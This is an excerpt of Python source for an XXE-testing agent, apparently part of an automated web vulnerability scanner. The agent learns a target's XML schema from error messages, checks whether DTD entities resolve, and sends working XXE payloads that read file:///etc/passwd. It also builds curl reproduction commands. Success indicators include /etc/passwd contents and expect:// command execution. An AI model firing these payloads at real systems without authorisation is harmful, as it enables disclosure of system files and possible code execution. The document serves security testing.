...
class XXEAgent(BaseAgent, TechContextMixin):
    ...
    def _validate_before_emit(self, finding: Dict) -> Tuple[bool, str]:
        ...
        # MANUAL_REVIEW_RECOMMENDED is an intentional "surface for human/AI-Repeater
        # confirmation" verdict (e.g. blind XXE) that legitimately lacks in-band proof.
    ...
    def _determine_validation_status(self, payload: str, evidence: str = "success") -> str:
        ...
        # Default: not definitively proven (no file disclosure / OOB / DTD / entity
        # confirmation) → require validation instead of auto-confirming an anomaly.
        logger.info(f"[{self.name}] XXE anomaly detected - PENDING_VALIDATION (needs verification)")
        return ValidationStatus.PENDING_VALIDATION.value
    ...
    def _check_xxe_indicators(self, text: str) -> bool:
        ...
        # Genuine XXE success only: file-disclosure signatures, our own canary, OOB, or
        # expect:// RCE. libxml2 errors ("failed to load external entity" / "No such file
        # or directory") mean the entity was BLOCKED — no disclosure — so they are NOT
        # success; counting them auto-confirmed blocked attempts as CRITICAL.
        indicators = [
            "root:x:0:0",                  # /etc/passwd success
            "BUGTRACE_XXE_CONFIRMED",      # Internal Entity success (our canary)
            "[extensions] found",          # Win.ini success (if testing windows)
            "uid=0(root)",                  # RCE success (expect://)
            "XXE OOB Triggered"             # Blind Detection
        ]
...
Respect the "_discovered": true flag - these are autonomously discovered endpoints and should NOT be deduplicated unless they are truly identical."""
    ...
    async def start_queue_consumer(self, scan_context: str) -> None:
        ...
        self._v.emit("exploit.specialist.completed", {"agent": "XXE", "dry_count": len(dry_list), "vulns": vulns_count, "candidates": candidates_count})
    ...
    async def _learn_xml_schema(self, session) -> dict:
        """Error-guided XML schema learning (target-agnostic). POST a minimal doc, read
        '<Field> could not be parsed from XML' errors, and accumulate the demanded leaf
        fields until the doc is accepted. Returns {'root': str, 'fields': [str, ...]}
        where fields[0] is the injection sink. Empty fields ⇒ no structured schema learned.
        No per-target paths/field names are hardcoded — everything is read from responses."""
        import re as _re
        root = "bt"
        fields = []
        for _ in range(6):  # bounded probing
            inner = "".join(f"<{f}>1</{f}>" for f in fields)
            doc = f'<?xml version="1.0"?><{root}>{inner}</{root}>'
            try:
                async with session.post(self.url, data=doc,
                                        headers={"Content-Type": "application/xml"},
                                        timeout=aiohttp.ClientTimeout(total=6)) as resp:
                    body = (await resp.text())[:2000]
            except Exception:
                break
            m = _re.search(r"([A-Za-z][A-Za-z0-9 _\-]{1,40}?)\s+could not be parsed from XML", body, _re.I)
            if not m:
                break  # accepted (or a non-schema response) → done learning
            parts = [p for p in m.group(1).strip().split() if p]
            # "Product ID" → "productId", "Store ID" → "storeId", "Username" → "username"
            elem = parts[0].lower() + "".join(p[:1].upper() + p[1:].lower() for p in parts[1:])
            if not elem or elem in fields:
                break
            fields.append(elem)
        return {"root": root, "fields": fields}

    async def _test_schema_aware_xxe(self, session) -> dict:
        """Target-agnostic schema-aware XXE test with blind-safe evidence. Learns the
        endpoint's XML shape, proves XML processing + DTD entity resolution deterministically,
        and attempts in-band file disclosure. NEVER fabricates confirmation: returns a blind
        candidate when the endpoint parses XML but does not echo entity content."""
        result = {"xml_processes": False, "entity_resolves": False,
                  "confirmed": False, "best_payload": None, "evidence": {}}
        schema = await self._learn_xml_schema(session)
        fields = schema.get("fields") or []
        root = schema.get("root", "bt")
        if not fields:
            return result  # nothing structured to shape a payload around
        sink = fields[0]

        def _doc(sink_value, doctype=""):
            inner = "".join(f"<{f}>{sink_value if i == 0 else '1'}</{f}>" for i, f in enumerate(fields))
            return f'<?xml version="1.0"?>{doctype}<{root}>{inner}</{root}>'
        ...
        _PARSE_ERR = ("could not be parsed", "xml parsing error", "not allowed", "not well-formed")

        # (1) XML-processing proof: a well-formed schema doc yields a semantic (non-error) reply
        base_body = await _post(_doc("1"))
        if base_body and not any(e in base_body.lower() for e in _PARSE_ERR):
            result["xml_processes"] = True

        # (2) DTD entity-resolution differential (numeric sentinel, blind-safe): if a general
        # internal entity resolves to the SAME downstream response as its literal value, the
        # parser processes DOCTYPE entities → external-entity (XXE) processing is in reach.
        SENT = "8675309"
        int_body = await _post(_doc("&xxe;", doctype=f'<!DOCTYPE {root} [<!ENTITY xxe "{SENT}">]>'))
        lit_body = await _post(_doc(SENT))
        if (int_body and int_body == lit_body
                and not any(e in int_body.lower() for e in _PARSE_ERR)):
            result["entity_resolves"] = True

        # (3) In-band external file disclosure — confirms on NON-blind targets only
        file_payload = _doc("&xxe;", doctype=f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>')
        file_body = await _post(file_payload)
        if self._check_xxe_indicators(file_body):
            result["confirmed"] = True
            result["best_payload"] = file_payload
            result["evidence"] = {"file_content": True, "snippet": file_body[:200], "sink_field": sink}
            return result

        # Blind: keep the file-read payload as the best candidate for OOB / AI-Repeater follow-up
        result["best_payload"] = file_payload
        result["evidence"] = {"sink_field": sink, "schema_fields": fields, "blind": True}
        return result

    def _create_blind_candidate_finding(self, res: dict) -> Dict:
        """Honest blind-XXE candidate: the endpoint provably parses attacker XML (and, where
        shown, resolves DTD entities) but does not reflect entity content, so it cannot be
        auto-confirmed in-band. Surfaced as PENDING_VALIDATION for OOB / AI-Repeater follow-up."""
        payload = res.get("best_payload") or (
            '<?xml version="1.0"?><!DOCTYPE bt [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<bt><productId>&xxe;</productId><storeId>1</storeId></bt>'
        )
        entity_note = (" DTD entity processing is enabled (internal-entity differential matched "
                       "the literal value)." if res.get("entity_resolves") else "")
        return {
            "type": "XXE",
            "url": self.url,
            "parameter": "post_body",
            "payload": payload,
            "validated": True,  # passed the agent's deterministic XML-processing bar → surface it
            # MANUAL_REVIEW_RECOMMENDED (not PENDING_VALIDATION): the CDP/vision validator is
            # browser-based and would mis-score a blind POST/XML vuln as a false positive and
            # drop it. This status routes the candidate straight to the report's manual-review
            # section for OOB / AI-Repeater confirmation.
            "status": "MANUAL_REVIEW_RECOMMENDED",
            "severity": "HIGH",
            "description": (
                "Blind XXE attack surface: the endpoint parses attacker-controlled XML."
                + entity_note +
                " Entity/file content is NOT reflected in the response (blind), so automated "
                "in-band confirmation is not possible. Confirm out-of-band (Interactsh/collaborator) "
                "or with the AI Repeater using the provided payload."
            ),
            "evidence": {
                "xml_processing_confirmed": bool(res.get("xml_processes")),
                "entity_resolution_confirmed": bool(res.get("entity_resolves")),
                "blind": True,
                "confirmation_method": "OOB (Interactsh) or AI Repeater",
                "detail": res.get("evidence", {}),
            },
            "reproduction": f"curl -X POST '{self.url}' -H 'Content-Type: application/xml' --data '{payload[:180]}'",
            "cwe_id": get_cwe_for_vuln("XXE"),
            "remediation": get_remediation_for_vuln("XXE"),
            "cve_id": "N/A",
            "http_request": f"POST {self.url}\nContent-Type: application/xml\n\n{payload[:220]}",
            "http_response": "XML parsed & processed (semantic response); entity content not reflected (blind XXE).",
        }
    ...
    async def _test_single_url_from_queue(self, url: str, finding: dict) -> Optional[Dict]:
        ...
        try:
            ...
            async with orchestrator.session(DestinationType.TARGET) as session:
                self._configure_session(session)
                # Test with heuristic payloads (classic in-band-confirmable targets)
                successful_payloads, best_payload = await self._test_heuristic_payloads(session)

                if successful_payloads:
                    return self._create_finding(best_payload, successful_payloads)

                # Schema-aware test: adapt the payload to the endpoint's own XML shape.
                # Confirms in-band when the target echoes file content; otherwise, if the
                # endpoint provably parses XML, yields an honest blind PENDING candidate.
                schema_res = await self._test_schema_aware_xxe(session)
                if schema_res.get("confirmed"):
                    return self._create_finding(schema_res["best_payload"], [schema_res["best_payload"]])
                ...
                # Blind XXE surface: endpoint parses attacker XML but does not echo content.
                if schema_res.get("xml_processes"):
                    return self._create_blind_candidate_finding(schema_res)
